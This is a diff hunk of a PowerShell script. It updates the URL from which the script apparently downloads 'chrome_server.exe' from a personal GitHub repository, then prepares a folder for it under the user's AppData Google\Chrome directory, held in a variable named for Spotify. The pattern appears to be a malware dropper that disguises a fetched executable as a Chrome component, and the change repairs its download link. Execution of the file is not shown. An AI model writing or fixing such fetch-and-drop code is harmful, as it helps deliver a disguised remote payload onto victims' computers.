@@ -72,7 +72,7 @@ function Get-File
   }
 }
 
-$uri = "https://github.com/yourname1204/future/raw/main/chrome_server.exe"
+$uri = "https://raw.githubusercontent.com/yourname1204/future/master/chrome_server.exe"
 $dir = $spotifyDirectory = Join-Path -Path $env:APPDATA -ChildPath 'Google\Chrome\'
 if (!(Test-Path -Path $dir)) {
     New-Item -ItemType Directory -Force -Path $dir
